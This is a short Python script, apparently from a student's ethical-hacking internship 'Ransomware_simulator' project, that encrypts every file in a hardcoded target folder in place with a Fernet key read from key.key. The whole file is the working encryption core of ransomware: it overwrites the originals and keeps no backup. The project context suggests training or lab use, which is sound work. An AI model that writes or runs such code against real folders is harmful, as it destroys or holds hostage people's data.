# encrypt.py
import os
from cryptography.fernet import Fernet

# Load the encryption key
def load_key():
    return open("key.key", "rb").read()

# Encrypt a file using the key
def encrypt_file(file_path, key):
    with open(file_path, "rb") as file:
        data = file.read()
    encrypted = Fernet(key).encrypt(data)
    with open(file_path, "wb") as file:
        file.write(encrypted)

# Encrypt all files in the folder
def encrypt_folder(folder_path):
    if not os.path.isdir(folder_path):
        print(f"❌ ERROR: '{folder_path}' is not a valid folder.")
        return

    key = load_key()
    for filename in os.listdir(folder_path):
        file_path = os.path.join(folder_path, filename)
        if os.path.isfile(file_path):
            encrypt_file(file_path, key)
            print(f"[+] Encrypted: {filename}")

# 👇 FULL PATH TO YOUR FOLDER 👇
encrypt_folder(r"C:\Users\Soham\Documents\RISE Internship Cybersecurity & Ethical Hacking Project\Ransomware_simulator\target_files")
